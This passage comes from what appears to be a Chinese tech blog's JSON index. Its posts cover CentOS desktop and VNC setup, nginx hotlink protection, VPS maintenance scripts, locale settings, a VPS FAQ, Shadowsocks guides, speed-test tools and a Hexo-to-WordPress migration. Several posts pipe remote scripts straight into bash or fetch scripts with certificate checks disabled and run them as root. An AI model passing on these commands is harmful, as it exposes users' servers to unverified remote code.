都行，不过它们代表 Linux 中不同的控制台），或者反过来 Ctrl + Alt + F7 回到刚才的图形界面。 更换桌面环境： 更改以下配置为对应的桌面环境 12345[root@xx ~]# cat /etc/sysconfig/desktopDESKTOP=&quot;KDE&quot;DISPLAYMANAGER=&quot;KDE&quot;#DESKTOP=&quot;GNOME&quot;#DISPLAYMANAGER=&quot;GNOME&quot; 卸载桌面环境 如果用腻了，如果想卸载，可以用以下命令： 12# yum groupremove &quot;Desktop Platform&quot;# yum groupremove &quot;KDE Desktop&quot; 汇总下CentOS7的安装命令 12345678910111213141516171819202122232425yum groupinstall -y &quot;KDE Plasma Workspaces&quot; #安装KDE#安装桌面环境常用软件yum groupinstall -y &quot;Graphical Administration Tools&quot; &quot;Internet Browser&quot; &quot;General Purpose Desktop&quot; systemctl set-default graphical.target #设置默认启动到图形界面#下面的方法也是设置默认启动图形界面之一，和上面的那条命令是一样的unlink /etc/systemd/system/default.targetln -sf /lib/systemd/system/graphical.target /etc/systemd/system/default.targetyum -y install tigervnc-server #安装vnc服务端#从VNC备份库中复制service文件到系统service服务管理目录下cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service#编辑配置文件vim vncserver@:1.service，找到下面对应位置改成下面这样cd /etc/systemd/systemExecStart=/sbin/runuser -l root -c &quot;/usr/bin/vncserver %i&quot; PIDFile=/root/.vnc/%H%i.pidsystemctl daemon-reload #重新加载 systemdvncpasswd #设置vnc密码firewall-cmd --permanent --add-service vnc-server #添加访问权限systemctl restart firewalld.service #重启firewalldsystemctl enable vncserver@:1.service #设置vnc开机启动systemctl start vncserver@:1.service #启动vnc会话服务#systemctl status vncserver@:1.service #查看nvc会话服务状态#systemctl stop vncserver@:1.service #关闭nvc会话服务","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Nginx防盗链设置","slug":"nginx-decline-sitescross","date":"2017-11-30T10:31:40.000Z","updated":"2017-11-30T10:31:40.000Z","comments":true,"path":"nginx-decline-sitescross.html","permalink":"https://sobaigu.com/nginx-decline-sitescross.html","excerpt":"一般来说我们的服务器或者VPS的流量是有一定限额的，我们网站上面的一些图片可能是流量的主要消耗来源，如果图片资源被人盗链盗用的话那对我们的资源损耗是巨大的。这里介绍个简单的办法处理LNMP环境下面的图片盗用问题：","text":"一般来说我们的服务器或者VPS的流量是有一定限额的，我们网站上面的一些图片可能是流量的主要消耗来源，如果图片资源被人盗链盗用的话那对我们的资源损耗是巨大的。这里介绍个简单的办法处理LNMP环境下面的图片盗用问题： 123456789101112131415161718server &#123; listen 80; server_name demo.sobaigu.com; index index.html index.htm index.php; root /var/www/demo; # 这里为图片添加为期 1 年的过期时间, 并且禁止 Google, 百度和本站之外的网站引用图片 location ~ .*\\.(ico|jpg|jpeg|png|gif)$ &#123; expires 1y; valid_referers none blocked demo.sobaigu.com *.google.com *.baidu.com; if ($invalid_referer) &#123; return 404; &#125; &#125; log_format demo.sobaigu.com ‘$remote_addr – $remote_user [$time_local] $request’ ‘$status $body_bytes_sent $http_referer ‘ ‘$http_user_agent $http_x_forwarded_for’; access_log /var/log/demo.sobaigu.com.log demo.sobaigu.com;&#125;","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"VPS维护用到的一些shell整理收集","slug":"linux-shell-with-vps","date":"2017-11-21T14:11:32.000Z","updated":"2017-12-12T03:11:11.000Z","comments":true,"path":"linux-shell-with-vps.html","permalink":"https://sobaigu.com/linux-shell-with-vps.html","excerpt":"常常会用到一些shell，整理汇总起来，方便自己以后操作，也可以给大家做参考。 当然，用这些shell前你最好是能把Linux的基础知识给学会了，起码要知道Linux怎么登录吧~~~囧","text":"常常会用到一些shell，整理汇总起来，方便自己以后操作，也可以给大家做参考。 当然，用这些shell前你最好是能把Linux的基础知识给学会了，起码要知道Linux怎么登录吧~~~囧 VPS一键测试脚本bench.sh 这个脚本有可能会消耗比较多的流量，如果有流量限制的机器还是慎用 显示当前测试的各种系统信息； 取自世界多处的知名数据中心的测试点，下载测试比较全面； 支持 IPv6 下载测速； IO 测试三次，并显示平均值。 再配合 unixbench.sh 脚本测试，即可全面测试 VPS 的性能，更多工具可见：Linux系统网络测速工具 使用方法： 命令1：wget -qO- bench.sh | bash或者curl -Lso- bench.sh | bash 命令2：wget -qO- 86.re/bench.sh | bash或者curl -so- 86.re/bench.sh | bash bench.sh 既是脚本名，同时又是域名,所以不要怀疑写错了或者你看错了。 一键安装Shadowsocks 四合一版 几乎是玩vps必备，不装Shadowsocks多浪费国外vps 该shell来自秋水逸冰，四合一版本 系统支持：CentOS 6+，Debian 7+，Ubuntu 12+ 内存要求：≥128M 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log Shadowsocks-go一键安装脚本 123wget --no-check-certificate -O shadowsocks-go.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-go.shchmod +x shadowsocks-go.sh./shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log Shadowsocks-go静默安装 123wget --no-check-certificate -O shadowsocks-go.sh https://raw.githubusercontent.com/cdnf/shell/master/shadowsocks-go.shchmod +x shadowsocks-go.sh./shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log 卸载方法 若已安装多个版本，则卸载时也需多次运行（每次卸载一种），使用root用户登录，运行以下命令： 1./shadowsocks-all.sh uninstall 启动脚本 启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 Shadowsocks-Python 版：/etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版：/etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版：/etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版：/etc/init.d/shadowsocks-libev start | stop | restart | status 一键重启SS服务端 1/etc/init.d/shadowsocks-go restart || /etc/init.d/shadowsocks restart 各版本默认配置文件 Shadowsocks-Python 版：/etc/shadowsocks-python/config.json ShadowsocksR 版：/etc/shadowsocks-r/config.json Shadowsocks-Go 版：/etc/shadowsocks-go/config.json Shadowsocks-libev 版：/etc/shadowsocks-libev/config.json 一键安装宝塔面板 一般用不到，但偶尔还是有人要，记录之。 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install.sh &amp;&amp; sh install.sh 网站Git自动部署 以下脚本实施方案场景是hexo程序部署在vps上，然后Git提交文章源文件，触发Git自动渲染并发布到其他Git仓库。实际应用可见：Hexo博客Git-VPS部署完整记录 同时，为SEO需要，将新文章自动提交到百度站长平台及熊掌号。 123456789101112131415161718192021#!/bin/bashunset GIT_DIRGIT_REPO=/home/git/sobaigu.gitTMP_GIT_CLONE=/tmp/hexoHEXO_HOME=/home/git/sobaiguPUBLIC_WWW=/home/wwwroot/sobaigu.comrm -rf $&#123;TMP_GIT_CLONE&#125;git clone $GIT_REPO $TMP_GIT_CLONEcp -rf $&#123;TMP_GIT_CLONE&#125;/hexo/* $&#123;HEXO_HOME&#125;cd $&#123;HEXO_HOME&#125;hexo cleanhexo g #有些vps上连着写貌似会出现改时区设置什么的，导致&amp;&amp;无法执行下去hexo drm -rf $&#123;PUBLIC_WWW&#125;/*cp -rf $&#123;HEXO_HOME&#125;/public/* $&#123;PUBLIC_WWW&#125;### 将最新文章自动推送熊掌号和百度站在平台 ###cd $&#123;TMP_GIT_CLONE&#125;git diff --name-status HEAD^ &gt;gitdiff.logsed -e &#x27;s/^.*_posts\\/......../http:\\/\\/sobaigu.com\\//&#x27; -e &#x27;s/md$/html/&#x27; gitdiff.log &gt;urls.txtcurl -H &#x27;Content-Type:text/plain&#x27; --data-binary @urls.txt &quot;http://data.zz.baidu.com/urls?appid=xxx&amp;token=yyy&amp;type=realtime&quot;curl -H &#x27;Content-Type:text/plain&#x27; --data-binary @urls.txt &quot;http://data.zz.baidu.com/urls?site=sobaigu.com&amp;token=zzz&quot; 注意： 一定要 unset GIT_DIR 清除变量， 不然会引起 remote: fatal: Not a git repository: ‘.’ 错误。 上面的 sed 写法请根据自己的实际情况增删改。 1grep -r -l &#x27;index.html&#x27; * &gt;urllist.txt 之前用的 grep 命令，没看到后面的 * ，翻遍帮助说明，一直蒙圈，这个就是过滤出所有包含查找字符串的文件名。 生成随机密码 每次我们想要获得一个密码的时候都很头疼，可用下面的shell逻辑实现一个获取任意位数随机密码的脚本： 12345678910111213141516171819202122232425#!/bin/bash# 如果得到参数 则将得到的参数作为密码的位数，否则指定密码位数为8if [ -n &quot;$1&quot; ]; then length=$1;else length=8; fi# 设定可以作为密码的字符串chars=&#x27;abcdefghijkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789&#x27;# 获取上面的字符串的长度，其实可以直接数一下，这不是练一下 shell 嘛charsLength=`echo $chars | wc -m | sed &#x27;s/^[ \\t]*//g&#x27;`# 初始的为空pw=&#x27;&#x27;# 根据所需密码长度进行循环for ((i=0;i&lt;$length;i++));do # 取得一个随机数 # $RANDOM 是获取一个小于 32767 的随机数 # 所以除以 32767 就可以得到一个 0 - 1 之间的随机小数 r=`echo $RANDOM/32767 | bc -l` # 根据随机数*字符长度取得一个数字 num=`echo $r*$charsLength | bc` # 将取得数字向上取整，并在字符串中截取对应位置的字符 w=`echo $chars | cut -c$(($&#123;num//.*/+1&#125;))` # 字符追加到 pw 这个变量 pw=$pw$wdone# 输出我们想要的密码echo $pw 一键安装最新内核并开启BBR BBR指Google开源的TCP BBR 拥塞控制算法，从 kernel 4.9 开始，Linux 内核已经用上了该算法。 根据实际测试，在部署了最新版内核并开启了 TCP BBR 的机器上，网速甚至可以提升好几个数量级。 系统支持：CentOS 6+，Debian 7+，Ubuntu 12+ 虚拟技术：OpenVZ 以外的，比如 KVM、Xen、VMware 等 内存要求：≥128M 关于本脚本 脚本出自秋水逸冰大神 本脚本已在大部分 VPS 全部测试通过。 当脚本检测到 VPS 的虚拟方式为 OpenVZ 时，会提示错误，并自动退出安装。 脚本运行完重启发现开不了机的，打开 VPS 后台控制面板的 VNC, 开机卡在 grub 引导, 手动选择内核即可。 由于是使用最新版系统内核，最好请勿在生产环境安装，以免产生不可预测之后果。 使用方法 使用root用户登录，运行以下命令： 1wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh 安装完成后，脚本会提示需要重启 VPS，输入 y 并回车后重启。 重启完成后，进入 VPS，验证一下是否成功安装最新内核并开启 TCP BBR，输入以下命令： 12uname -r #查看内核版本大于4.9就OK了lsmod | grep bbr #出现了`tcp_bbr`就OK 更多细节请参考秋水逸冰的博客。 编译安装lnmp 几乎是网站服务器必备，省心省力，最新版是lnmp1.4 1wget -c http://soft.vpser.net/lnmp/lnmp1.4.tar.gz &amp;&amp; tar zxf lnmp1.4.tar.gz &amp;&amp; cd lnmp1.4 &amp;&amp; ./install.sh lnmp 一键安装常用软件 主要方便自己使用，安装什么软件自行扩展。 1yum update -y &amp;&amp; yum install wget vim lrzsz screen -y","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Linux设置locale为中文解决shell终端乱码问题","slug":"linux-set-locale-for-chinese","date":"2017-11-20T02:30:51.000Z","updated":"2017-11-20T02:30:51.000Z","comments":true,"path":"linux-set-locale-for-chinese.html","permalink":"https://sobaigu.com/linux-set-locale-for-chinese.html","excerpt":"","text":"前言 在Centos中通过locale来设置程序运行的不同语言环境，locale由ANSI C提供支持。locale的命名规则为&lt;语言&gt;_&lt;地区&gt;.&lt;字符集编码&gt;，如zh_CN.UTF-8，zh代表中文，CN代表大陆地区，UTF-8表示字符集。在locale环境中，有一组变量，代表国际化环境中的不同设置。 locale导致的问题 中国人使用，总会出现中文名的文件或者文件内容是中文的，一般locale未指定则使用英文语言，此时查看中文文件将会出现乱码。 可以使用以下命令查看当前语言环境： 123456789101112131415161718[root@sobaigu.com]# echo $LANG #只显示使用的语言zh_CN.utf8[root@sobaigu.com]# locale #显示区域环境LANG=zh_CN.utf8LC_CTYPE=&quot;zh_CN.utf8&quot;LC_NUMERIC=&quot;zh_CN.utf8&quot;LC_TIME=&quot;zh_CN.utf8&quot;LC_COLLATE=&quot;zh_CN.utf8&quot;LC_MONETARY=&quot;zh_CN.utf8&quot;LC_MESSAGES=&quot;zh_CN.utf8&quot;LC_PAPER=&quot;zh_CN.utf8&quot;LC_NAME=&quot;zh_CN.utf8&quot;LC_ADDRESS=&quot;zh_CN.utf8&quot;LC_TELEPHONE=&quot;zh_CN.utf8&quot;LC_MEASUREMENT=&quot;zh_CN.utf8&quot;LC_IDENTIFICATION=&quot;zh_CN.utf8&quot;LC_ALL= 设置中文字符集 locale -a可以查看系统支持的语言，如有zh_cn.UTF-8 表示已经安装了中文语言，如果没有则可以自己安装： 1yum group install chinese-support 临时更换语言支持 如果只是临时更换linux系统的语言环境，可以通过输入设置 LANG=语言名称， 如中文是LANG=zh_CN.UTF-8 Linux是大小写敏感的，所以请注意字符大小写 修改系统默认语言 以下方法是通过修改设置系统默认的语言配置，如vi /etc/sysconfig/i18n，在里面加上如下内容： 1LANG=&quot;zh_CN.UTF-8&quot; 注意改好之后重启一下系统才能生效 还有一种说法是修改profile文件，但实测修改后会出现如下错误，而且locale也没更改过来，大家用以上方法即可。 -bash: export: `en_US.UTF-8’: not a valid identifier","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"VPS使用入门常见问题","slug":"vps-faq","date":"2017-11-19T08:23:41.000Z","updated":"2017-11-19T08:23:41.000Z","comments":true,"path":"vps-faq.html","permalink":"https://sobaigu.com/vps-faq.html","excerpt":"","text":"前言 偶尔帮朋友代购些国外的VPS，以美国VPS居多，所以经常会被问到些问题，有时候问题挺雷同的，有时间好好整理下，毕竟临时找答案费时费力。 VPS是什么 VPS全称是Virtual Private Server，虚拟私有主机的意思，通俗理解就是在某个机房有台或者有群实体宿主服务器机器，这宿主机里装了些虚拟机。 VPS平台的运行和管理都与一台独立主机完全相同，因为每一个VPS均是隔离独立的： 每一个VPS拥有其独立的用户、进程、文件并提供完全ROOT访问权限 每一个VPS可以拥有独立IP地址、端口、表单、以及过滤和路由规则 每个VPS可以拥有自己的系统配置文件并能够装载需要的应用程序 每个VPS可以拥有自己的系统函数库版本或者修改现有的系统函数库版本 VPS可以做什么 VPS就是一个虚拟的电脑，所以理论上你电脑里能做的事VPS上也能做，而且你不用担心断电，不用搞内网穿透的问题。所以一般VPS会拿来当服务器使用，搭网站服务器，搭代理服务器，当FTP服务器等都可以，根据自己的需求安装对应的应用即可。 VPS不能做的事 当然，挖矿这种烧硬件的事就别想了，虚拟机没显卡，CPU也吃不消！ 还有，做违法的事也不行，比如利用VPS网络攻击国家领导人，境外抹黑造谣祖国，扫肉鸡，拿来当攻击机等都不行！！！不要以为自己聪明，机房都有程序专门程序在监控这些行为，一旦发现滥用直接关机屏蔽无疑，而且不给机会恢复。 能不能搭代理服务器 能，而且不难，用来查资料，了解国外风土人情推荐Linux系统装Shadowsocks，性能好，速度快，可以参考：Shadowsocks常见问题。 网上有一键安装脚本，偷懒的可以直接使用别人的一键安装脚本，或者我整理收集的shell脚本按提示就可以简单完成服务端安装。 Windows服务器也可以装Shadowsocks服务端，自行用搜索引擎搜索相关教程即可。 搭代理服务功能后一定一定一定不要干违法乱纪的事，不要随便给不靠谱的人分享，不要在任何地方留下故事。看什么都无所谓，要时刻头脑清晰分清是非黑白，我们的技术是用来找学习资料的，我们出去是为了赚老外的钱而已，请不要发言留迹！！！虽然SS能加密，但VPS的IP是暴露的，留迹的IP直接被封就不管你里面怎么加密了。 怎么管理控制 关于VPS管理，可以参考：你的VPS怎么远程管理 Linux一般都不装视窗，通过shell终端控制，所以要管理Linux建议学习必要的命令，可参考这个网站。 远程管理Linux一般用SSH客户端，这里有两款优秀的软件推荐： Xshell-Windows平台上优秀的 SSH 客户端 SecureCRT+SecureFX-支持多标签的 SSH 客户端 为了小白我也是操碎了心，特意做了个视频教程，自己看吧。如果不清晰就到youku去看 当然，如果不介意资源消耗，Linux也可以安装视窗软件，安装教程可见：给Linux系统安装桌面环境 安装桌面环境后，可以通过teamviewer，vncviewer等远程工具管理。 Windows系统也可以通过以上提到的软件或者自带的mstsc进行远程管理服务器，更推荐用：Remote Desktop Organizer 由于是远程桌面，毕竟是外网控制，想通过远程桌面看视频的体验都不会好，只是要隐藏ip的可以使用Shadowsocks代理方案 能装Windows系统吗 能，一般VPS提供商都会写明可选系统，如果没有Windows的说明不支持。 Windows系统对配置要求比Linux高，其次还有版权问题，所以商家一般都不提供，有Windows系统也要买家自己处理系统授权的问题，试用版或者未激活系统会被关机，Windows系统授权费交完这VPS的价格就没几个人会承受，所以大部分都是Linux系统，一般是centos或者ubuntu，通过远程shell操作，而且系统开机几百天不重启依然稳定如初，这是Windows无法比拟的。 机房里面鱼龙混杂，难免有一两个害群之马，用Windows的请一定第一时间给系统打补丁，该关的端口关闭，不要使用弱密码，否则系统中毒会害人害己。 一般中毒后在cmd里用netstat -na命令可以看到自己什么都没做，但一堆对外的连接，也就是你这个机器已经在开始扫描别人或者当了肉鸡了。 Linux能不能安装远程桌面环境 也能，用KVM实现的VPS可以装Gnome或者KDE等桌面环境，然后通过VNC远程，但一般不推荐这样用，装上视窗环境后，Linux系统的效率会变低。 具体安装方法可参考这里。 为什么要限制月流量 知道各大IT公司服务器成本都消耗在哪吗？硬件设备买一次用n年，你用与不用，成本就固定在那里，剩下的就是带宽流量费用了。一个两位数或者三位数价格的VPS，你居然指望流量不限？想多了！ 有些奸商打着不限量口号，但实际上限出口带宽，要不然我能用到他裤衩都不剩。一些小白就屁颠屁颠以为占了便宜，可算过帐没？限网络带宽出口10m，你就24小时满速可劲下载上传，一天下来也才100G你可知道？ 流量计算公式：(10m/8bit)*(3600s*24h)/1024=105.46875G 是不是很惊奇？而且有谁的服务器会24小时满速传输的？当你想用大带宽的时候你也被限制了，算下是不是买个月流量1T的还用得舒心？","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"ShadowSocks-影梭-科学上网之瑞士军刀","slug":"software-shadowsocks-client","date":"2017-11-19T06:30:21.000Z","updated":"2017-11-19T06:30:21.000Z","comments":true,"path":"software-shadowsocks-client.html","permalink":"https://sobaigu.com/software-shadowsocks-client.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小：0.5 m 支持系统：Windows/Linux/MacOS/Android/iOS 官方主页：github.com/shadowsocks/ 软件介绍 Shadowsocks-影梭，号称科学上网之瑞士军刀！最好的高性能Socks5安全代理工具！ Shadowsocks是一款可协助网友畅游网络的客户端小工具，功能非常强大，需要注意的是它需要服务器端配合才能发挥作用，你需自行搭建服务器端程序，配置好IP和密码等信息并启用服务后即可网络加速。 Shadowsocks 提供全局和PAC上网模式，可自由切换，支持在线更新PAC列表。让你体验科学上网带来的快感！ Shadowsocks功能特性： 高性能：基于异步 I/O，事件驱动的程序实现；专为大并发、大流量的应用场景优化；无需保持连接状态，适用于移动设备及无线网络。 低资源占用：完全以原生代码实现，后台服务内存占用不超过10MB。 跨平台：可以在PC、MAC、智能手机（iPhone与Android）、甚至路由器（OpenWRT）中运行。 安全：支持多种加密方案及多种加密强度，提供系统级别的网络数据加密。 开源：由社区维护的开源项目，包括GPL及MIT两种协议的多种实现。 基本使用 软件启动后，在任务栏右下角托盘区找到 Shadowsocks 小飞机图标 双击小飞机或者右键&gt;服务器&gt;编辑服务器菜单添加多个服务器 选择 启用系统代理 来启用系统代理。此时建议禁用浏览器里的代理插件，系统代理模式中选择PAC模式或全局模式。 如果不启用系统代理，你也可以直接自己配置浏览器代理。在 SwitchyOmega 中把代理设置为 SOCKS5 或 HTTP 的 127.0.0.1:1080。这个 1080 端口可以在服务器设置中设置。 关于PAC 可以编辑 PAC 文件来自定义PAC规则 你也可以从 GFWList （由第三方维护）更新 PAC 文件 你也可以使用在线 PAC URL 详细shadowsocks客户端添加PAC自定义规则见这里 更多的就不讲了，总之你值得拥有，原理可以看看：写给非专业人士看的 Shadowsocks 简介 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 hn5i 配合浏览器使用方法参见 爬墙之Switchysharp for Chrome_科学上网 自己搭建shadowsocks服务器参见 CentOS环境shadowsocks-libev一键安装脚本 CentOS_Debian搭建shadowsocks-libev服务端 Centos下安装shadowsocks-manyuser多用户版本带前端详细教程 数据库多用户教程 json版多用户教程（仅一台服务器适用）","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Linux系统网络测速工具","slug":"linux-net-speed-test-tools","date":"2017-11-15T06:34:48.000Z","updated":"2017-11-15T06:34:48.000Z","comments":true,"path":"linux-net-speed-test-tools.html","permalink":"https://sobaigu.com/linux-net-speed-test-tools.html","excerpt":"买了VPS或者安装Linux服务器后，有时候需要检查带宽网速情况，在Windows下有各种图形化客户端，也可以用浏览器打开测速网站进行测速。但装的Linux往往是没有视窗的，此时需要借助一些终端shell测速工具来完成。","text":"买了VPS或者安装Linux服务器后，有时候需要检查带宽网速情况，在Windows下有各种图形化客户端，也可以用浏览器打开测速网站进行测速。但装的Linux往往是没有视窗的，此时需要借助一些终端shell测速工具来完成。 常规下载工具测速 比如wget或者curl这种工具，下载某个网络上的文件来测速网络速度。 123456Saving to: `lnmp1.4-full.tar.gz&#x27;100%[===========================================&gt;] 488,716,790 48.5M/s in 8.9s 2017-11-15 13:11:59 (52.4 MB/s) - `lnmp1.4-full.tar.gz&#x27; saved [488716790/488716790] Speedtest speedtest是一个用Python编写的轻量级Linux命令行工具，在Python2.4至3.4版本下均可运行。它基于Speedtest.net的基础架构来测量网络的上/下行速率。 安装speedtest也不难： 1234wget https://raw.github.com/sivel/speedtest-cli/master/speedtest.pychmod a+rx speedtest.pymv speedtest.py /usr/local/bin/speedtestchown root:root /usr/local/bin/speedtest 执行以上几个命令就安装好了，然后运行的时候只要输入speedtest。如果你想分享测试结果，你可以使用参数–-share，它将会把你的测试结果上传到Speedtest.net服务器并以图形的方式分享给其他人。 一键测试脚本bench.sh 这个脚本个人很喜欢，测速结果也很详尽，几乎全面适用于各种 Linux 发行版的网络（下行）和 IO 测试： 显示当前测试的各种系统信息 取自世界多处的知名数据中心的测试点，下载测试比较全面 支持 IPv6 下载测速 IO 测试三次，并显示平均值 配合 unixbench.sh 脚本测试，即可全面测试 VPS 的性能。 使用方法： 123wget -qO- bench.sh | bash#或者下面这命令下载执行curl -Lso- bench.sh | bash bench.sh 既是脚本名，同时又是域名，所以不要怀疑写错了或者你看错了 下载地址：https://github.com/teddysun/across/blob/master/bench.sh iperf测速网络性能 iperf分为server和client，支持TCP测速和UDP测速，个人建议局域网使用UDP测速会比较准确，对于丢包率和延迟都能反映的比较明显，而TCP由于重传机制，真实的带宽会不准。 服务端监听UDP命令： iperf -s -u 客户端使用UDP测试命令：iperf -u -c 服务端IP -b 1000M -t 60 -i 10 iperf命令行的参数可以iperf -help查看，罗列一下参数： 123456-s server-c client + server IP-u udp-b bandwidth #这个是用来表示使用多大带宽进行发包，根据真实环境进行调整-t time #发包多长时间，单位是秒-i interval #结果输出间隔时间，如果不加这个参数，那么就等到全部测试完成才给结果 iftop查看单个IP耗费的流量 安装后直接iftop命令，然后就看到效果了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"苹果电脑MacOS安装设置Shadowsocks方法","slug":"how-to-use-shadowsocks-osx","date":"2017-11-11T06:30:21.000Z","updated":"2017-11-11T06:30:21.000Z","comments":true,"path":"how-to-use-shadowsocks-osx.html","permalink":"https://sobaigu.com/how-to-use-shadowsocks-osx.html","excerpt":"","text":"基本信息 程序类型：安装版 界面语言：中文英文 文件大小： m 支持系统：MacOS 官方主页： 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 hn5i 软件安装及配置 首先到下载页面下载，选择.dmg格式的下载，当然是下最新版啦，安装完成之后运行，在菜单栏就能看到Shadowsocks的图标了。 点击小飞机图标→「服务器」→「打开服务器设定」，根据帐号信息，填写服务器地址（IP或者域名），端口，加密方式和密码，点确定 同样，如果你有二维码，可以把网页停留在二维码图片，然后在菜单里面选择“从屏幕上扫描二维码”，扫码自动配置 选择刚刚配置好的服务器，点“打开”，Done！然后，Safari或者Chrome开始上网吧。 从菜单可以看到，代理模式有两种： 全局模式 自动代理模式 顾名思义，全局模式就是所有流量都走服务器，而自动代理模式是通过代理自动配置（英语：Proxy auto-config，简称PAC）文件来配置走服务器的流量。使用自动代理模式可以实现国内网站直连，国外网站使用代理连接，即加速了浏览国内网站的速度，又节省了服务器的流量，一石二鸟。 那么，如何修改代理自动配置文件呢？菜单上有三个选项和这个相关： 编辑自动模式的PAC… 从GFWList更新PAC 编辑GFWList的用户规则… 1的功能是定位PAC文件gfwlist.js的位置，2的功能是在线更新PAC文件，3的功能是定位用户规则文件user-rule.txt的位置。 具体的PAC规则设置可参考Shadowsocks-添加PAC自定义规则 Tips1：如果有网站打不开，或者图片刷不出来，切换全局试试 Tips2：同样可以编辑PAC，自定义通过服务器代-理的网站 视频教程 视频教程示例的是SSR客户端，大同小异，也推荐用SSR客户端，详见：苹果电脑-MacOS上SSR【ShadowsocksR】客户端视频教程 参考文档 Shadowsocks for OSX 帮助 Shadowsocks-GUI For Mac OS使用指南","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"Hexo数据导入到WordPress博客方法","slug":"hexo-to-wordpress","date":"2017-11-10T02:51:39.000Z","updated":"2017-11-10T02:51:39.000Z","comments":true,"path":"hexo-to-wordpress.html","permalink":"https://sobaigu.com/hexo-to-wordpress.html","excerpt":"","text":"前言 之前心血来潮把博客从WordPress转成了Hexo。Hexo是真的好，简洁，但也简陋，尤其是当第三方评论系统一个个停止服务的时候，Hexo的硬伤就暴露出来了。 突然有个想法，要不还是换回WordPress，毕竟WordPress要什么有什么，就是慢点，如果能静态化也应该能解决这问题。 然而，WordPress转Hexo容易，Hexo转WordPress却搜不到任何资料，看来技术大牛都不屑于再转回WordPress这种笨重的博客系统了。 可行方案 玩WordPress的人都知道，WordPress有一个完善的导入导出功能，可将文章，评论等数据导出为xml文件，也可以导入xml文件。 刚好，Hexo也可以输出xml订阅内容，那么两者就可以通过xml完成数据转移了。 Hexo输出xml Hexo默认是输出atom.xml订阅内容的，这个文件的标准是Atom 1.0的，而且默认输出最近20篇文章摘要，我们将其改成输出RSS 2.0标准，且将内容完整输出，在_config.yml中加入如下内容： 12345feed: type: rss2 path: rss2.xml limit: false hub: 其实这个是控制feed插件的，可看下hexo-generator-feed的说明文档。 改完保存后，重启Hexo server，访问localhost/rss2.xml，保存该文件或者直接hexo g，然后去public目录找这个文件就是了。 WordPress导入xml Hexo导出的rss2.xml导入WordPress这个在WordPress后台完成就行，如果没装该插件那就按提示安装即可，没什么好说的。 需要注意的是，因为不是定制的导入程序，导入WordPress后分类将会消失，这步如果接受不了，那就需要自己动手去改下WordPress的导入程序了。 还有就是永久链接会自动填上标题，并没有处理成Hexo中原先设定的链接形式。因为都用的%postname%.html链接形式，所以这块可以在mysql数据库中处理一把。 1UPDATE `wp_posts` SET `post_name` 